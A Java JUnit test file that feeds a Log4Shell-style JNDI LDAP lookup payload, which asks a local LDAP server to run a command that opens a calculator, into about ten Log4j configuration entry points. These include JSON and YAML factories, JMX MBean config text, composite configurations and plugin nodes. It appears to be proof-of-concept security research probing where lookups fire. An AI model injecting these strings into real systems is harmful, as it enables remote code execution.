import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Core;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.*;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
import org.apache.logging.log4j.core.config.composite.CompositeConfiguration;
import org.apache.logging.log4j.core.config.json.JsonConfiguration;
import org.apache.logging.log4j.core.config.json.JsonConfigurationFactory;
import org.apache.logging.log4j.core.config.plugins.util.PluginBuilder;
import org.apache.logging.log4j.core.config.plugins.util.PluginManager;
import org.apache.logging.log4j.core.config.plugins.util.PluginType;
import org.apache.logging.log4j.core.config.yaml.YamlConfigurationFactory;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.jmx.LoggerContextAdmin;
import org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.apache.logging.log4j.core.script.Script;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.concurrent.Executor;

public class ConfigPocTests {

    @Test
    public void getConfigurationJSONConfigurationFactoryTest() throws IOException {
        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        JsonConfigurationFactory factory = new JsonConfigurationFactory();
        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
    }

    @Test
    public void reconfigureJSONConfigurationTest() throws IOException {
        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        JsonConfiguration config = new JsonConfiguration(new LoggerContext("testContext"), source);
        config.reconfigure();
    }

    @Test
    public void setConfigLocationUriTest() {
        URI configUri = new File("config.json").toURI();
        LoggerContext context = (LoggerContext) LogManager.getContext(false);
        context.setConfigLocation(configUri);
    }

    @Test
    public void getConfigurationConfigurationFactoryTest() throws IOException {
        String configText = "{"
                + "\"Configuration\": {"
                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
                + "}"
                + "}";
        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
    }

    @Test
    public void createPatternParserPatternLayoutTest() {
        String configText = "{"
                + "\"Configuration\": {"
                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
                + "}"
                + "}";
        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
        PatternLayout.createDefaultLayout(config);
    }

    @Test
    public void getConfigurationYamlConfigurationFactoryTest() throws IOException {
        String yamlConfig = "Configuration:\n" +
                "  injectedProperty: \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"";
        ByteArrayInputStream bis = new ByteArrayInputStream(yamlConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        YamlConfigurationFactory factory = new YamlConfigurationFactory();
        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
    }

    @Test
    public void setConfigLocationUriLoggerContextAdminMBeanTest() throws Exception {
        LoggerContext context = new LoggerContext("testContext");
        LoggerContextAdminMBean mBean = new LoggerContextAdmin(context, new Executor() {
            @Override
            public void execute(Runnable command) {
                command.run();
            }
        });
        URI newConfigUri = new File("config.json").toURI();
        mBean.setConfigLocationUri(newConfigUri.toString());
    }


    @Test
    public void setConfigTextLoggerContextAdminMBeanTest() throws Exception {
        LoggerContext context = new LoggerContext("testContext");
        LoggerContextAdminMBean mBean = new LoggerContextAdmin(context, new Executor() {
            @Override
            public void execute(Runnable command) {
                command.run();
            }
        });

        mBean.setConfigText("<Configuration keyA=\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\">\n" +
                "</Configuration>\n", "UTF-8");
    }

    @Test
    public void reconfigureCompositeConfigurationTest() throws Exception {
        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
        AbstractConfiguration config = builder.addProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").build();
        CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
        compositeConfig.reconfigure();
    }


    @Test
    public void createConfigurationDefaultConfiguration() {
        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
        Configuration configuration = new DefaultConfiguration();
        manager.collectPlugins();
        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
        Node nodeA = new Node(null, "root", plugin);
        nodeA.setValue("root");
        Node nodeB = new Node(nodeA, "child", plugin);
        nodeB.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        configuration.createConfiguration(nodeB, new MutableLogEvent());
    }
}
